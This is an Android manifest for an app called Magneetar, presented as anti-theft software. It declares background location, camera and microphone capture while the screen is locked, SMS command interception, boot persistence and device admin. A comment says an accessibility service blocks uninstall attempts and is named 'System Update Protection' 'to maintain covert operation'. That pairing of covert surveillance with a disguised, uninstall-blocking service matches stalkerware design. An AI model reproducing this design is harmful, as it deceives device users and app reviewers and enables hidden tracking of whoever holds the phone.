<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    <!-- Network -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />

    <!-- Location -->
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />

    <!-- PROMINENT DISCLOSURE — background location (required by Google Play
         policy, enforced for targetSdk 30+):

         Magneetar is an anti-theft app. When a phone is marked STOLEN (or
         the owner arms remote evidence capture), the app reports the device
         location in the background — including while the screen is locked —
         so the owner can locate and recover the phone even after it falls
         into a thief's hands.

         This permission is only exercised when (a) the user has explicitly
         signed in and linked the device to their account, and (b) theft mode
         or evidence capture is active. Location is transmitted to the user's
         own Magneetar server account; it is never sold or shared with third
         parties, and no advertising/analytics use it.

         The in-app consent flow (PermissionsActivity) states the purpose and
         the dashboard settings page mirrors this disclosure. The Play
         Console data-safety form must ALSO declare "Approximate/Derived
         location" collection. -->
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"
        tools:ignore="ProtectedPermissions" />

    <!-- Camera (runtime) + Android 14+ foreground-service camera type.
         The FOREGROUND_SERVICE_* perms are normal install-time permissions
         (no runtime prompt); they let a camera|microphone FGS run while the
         screen is locked for remote evidence capture. -->
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
    <uses-feature
        android:name="android.hardware.camera"
        android:required="false" />
    <uses-feature
        android:name="android.hardware.camera.front"
        android:required="false" />

    <!-- Microphone (runtime) + Android 14+ foreground-service microphone type. -->
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />

    <!-- Storage -->
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />

    <!-- Notifications (Android 13+) -->
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />

    <!-- Boot & background -->
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />

    <!-- Exact alarms (Android 12+): SCHEDULE_EXACT_ALARM is a runtime-granted
         normal permission — the watchdog prefers exact alarms when the user
         has allowed them (system settings → alarms & reminders), and silently
         degrades to inexact alarms otherwise. USE_EXACT_ALARM is deliberately
         NOT declared: Play restricts it to core alarm/calendar apps, and a
         denied review would block the whole release for no survival benefit
         (see WatchdogReceiver.canScheduleExactAlarms fallback). -->
    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />

    <!-- Offline Command Relay (SMS): RECEIVE_SMS lets the app intercept
         command SMS from the server when the device has no data; SEND_SMS
         enables the BEST-EFFORT location/ack reply over SMS (works when the
         user granted SMS-manager status or on older Android — otherwise the
         reply degrades to the network outbox). READ_PHONE_STATE lets the app
         read its own SIM number (best-effort, often empty on Android 10+)
         so the dashboard can prefill the relay number. All are runtime
         permissions requested in PermissionsActivity. -->
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.SEND_SMS" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <!-- These SMS permissions imply the telephony hardware feature; declare it
         optional (required=false) so the app remains installable on devices
         without a cellular radio (ChromeOS tablets, Wi-Fi-only devices) — the
         SMS relay simply no-ops there. lint: PermissionImpliesUnsupportedChromeOsHardware. -->
    <uses-feature
        android:name="android.hardware.telephony"
        android:required="false" />

    <!-- Device admin is granted via the AdminReceiver declaration
         (android:permission="android.permission.BIND_DEVICE_ADMIN" on the
         receiver) — a top-level uses-permission here is redundant and
         triggers a lint ProtectedPermissions error. -->

    <application
        android:allowBackup="false"
        android:icon="@mipmap/ic_launcher"
        android:roundIcon="@mipmap/ic_launcher"
        android:label="Magneetar"
        android:theme="@style/AppTheme"
        android:supportsRtl="true"
        android:networkSecurityConfig="@xml/network_security_config">

        <!-- ─── Sentry: manual init only (auto-init crashes with empty DSN) ── -->
        <meta-data
            android:name="io.sentry.auto-init"
            android:value="false" />

        <!-- ─── Splash / Auth Router ─────────────────────────────────────── -->
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:theme="@style/AppTheme"
            android:windowSoftInputMode="adjustResize">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!-- ─── Onboarding ───────────────────────────────────────────────── -->
        <activity
            android:name=".OnboardingActivity"
            android:exported="false"
            android:theme="@style/AppTheme"
            android:windowSoftInputMode="adjustResize" />

        <!-- ─── Sign In ──────────────────────────────────────────────────── -->
        <activity
            android:name=".SignInActivity"
            android:exported="false"
            android:theme="@style/AppTheme"
            android:windowSoftInputMode="adjustResize" />

        <!-- ─── Sign Up ──────────────────────────────────────────────────── -->
        <activity
            android:name=".SignUpActivity"
            android:exported="false"
            android:theme="@style/AppTheme"
            android:windowSoftInputMode="adjustResize" />

        <!-- ─── Permissions ─────────────────────────────────────────────── -->
        <activity
            android:name=".PermissionsActivity"
            android:exported="false"
            android:theme="@style/AppTheme"
            android:windowSoftInputMode="adjustResize" />

        <!-- ─── Home ─────────────────────────────────────────────────────── -->
        <activity
            android:name=".HomeActivity"
            android:exported="false"
            android:theme="@style/AppTheme"
            android:windowSoftInputMode="adjustResize" />

        <!-- ─── Background Tracking Service ─────────────────────────────── -->
        <service
            android:name=".TrackingService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="location"
            android:stopWithTask="false" />

        <!-- ─── Dual-Service Persistence Layer ──────────────────────────── -->
        <service
            android:name=".PersistenceService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="dataSync"
            android:stopWithTask="false" />

        <!-- ─── Armed Evidence Capture Service ─────────────────────────── -->
        <!-- Remote photo/front/audio capture MUST run in a foreground service
             typed camera|microphone: on Android 14+ (targetSdk 35) a location-
             only FGS cannot open the camera or mic while the app is in the
             background (screen locked). NOTE: Android does NOT permit starting
             a camera/mic FGS from the background just because a location FGS
             is running — the while-in-use CAMERA/RECORD_AUDIO permissions are
             not active then, and the start throws. So this service is an
             ARMED WATCH: it is started once from a foreground context
             (HomeActivity auto-arms on open) or a "Re-arm" notification tap
             (a user action that grants the exemption), and stays running
             (START_STICKY, stopWithTask=false). Remote commands then target
             the already-running service. If it dies, TrackingService/
             BootReceiver post a tap-to-re-arm prompt and commands ack
             'failed' honestly until re-armed. -->
        <service
            android:name=".MediaCaptureService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="camera|microphone"
            android:stopWithTask="false" />

        <!-- ─── Firebase Cloud Messaging ───────────────────────────────── -->
        <service
            android:name=".MagneetarMessagingService"
            android:exported="false">
            <intent-filter>
                <action android:name="com.google.firebase.MESSAGING_EVENT" />
            </intent-filter>
        </service>

        <!-- Default FCM notification handler -->
        <receiver
            android:name="com.google.firebase.iid.FirebaseInstanceIdReceiver"
            android:exported="true"
            android:permission="com.google.android.c2dm.permission.SEND">
            <intent-filter>
                <action android:name="com.google.android.c2dm.intent.RECEIVE" />
            </intent-filter>
        </receiver>

        <!-- ─── Boot Receiver ───────────────────────────────────────────── -->
        <receiver
            android:name=".BootReceiver"
            android:enabled="true"
            android:exported="true"
            android:directBootAware="true">
            <intent-filter android:priority="999">
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
            </intent-filter>
        </receiver>

        <!-- ─── Watchdog Receiver (AlarmManager) ────────────────────────── -->
        <receiver
            android:name=".WatchdogReceiver"
            android:enabled="true"
            android:exported="false"
            android:directBootAware="true" />

        <!-- ─── Offline Command Relay: SMS receiver ─────────────────────── -->
        <!-- high priority so it sees command SMS before the default SMS app
             stores them; it only acts when the pairing code matches. -->
        <receiver
            android:name=".SmsCommandReceiver"
            android:enabled="true"
            android:exported="false">
            <!-- android:exported=false is fine: the SYSTEM delivers the
                 SMS_RECEIVED broadcast (exempt from the implicit-broadcast
                 ban) to receivers that declare RECEIVE_SMS; the attribute
                 only gates explicit intents from other apps. -->
            <intent-filter android:priority="999">
                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
            </intent-filter>
        </receiver>

        <!-- ─── Environment Receiver (power/connectivity/time restart) ──── -->
        <!-- OEM battery killers release paused apps on these events — restart
             the tracking services so a killed app comes back without waiting
             for the AlarmManager/WorkManager cycle. -->
        <receiver
            android:name=".EnvironmentReceiver"
            android:enabled="true"
            android:exported="false">
            <intent-filter>
                <action android:name="android.intent.action.POWER_CONNECTED" />
                <action android:name="android.intent.action.POWER_DISCONNECTED" />
                <action android:name="android.intent.action.BATTERY_LOW" />
                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
                <action android:name="android.intent.action.TIME_SET" />
                <action android:name="android.intent.action.TIMEZONE_CHANGED" />
                <action android:name="android.intent.action.USER_PRESENT" />
            </intent-filter>
        </receiver>

        <!-- ─── Device Admin ────────────────────────────────────────────── -->
        <receiver
            android:name=".AdminReceiver"
            android:exported="true"
            android:permission="android.permission.BIND_DEVICE_ADMIN">
            <meta-data
                android:name="android.app.device_admin"
                android:resource="@xml/device_admin" />
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
            </intent-filter>
        </receiver>

        <!-- ─── Uninstall Guard (Accessibility Service) ───────────────── -->
        <!-- LAYER 2 PROTECTION: Monitors UI navigation to detect and block
             uninstall attempts. When enabled, this service intercepts any
             navigation to Settings > Apps > Magneetar and sends the user
             back to the home screen. Requires manual activation in
             Settings > Accessibility > System Update Protection.

             The service is named 'System Update Protection' to maintain
             covert operation. -->
        <service
            android:name=".UninstallGuardService"
            android:exported="false"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>

    </application>

</manifest>
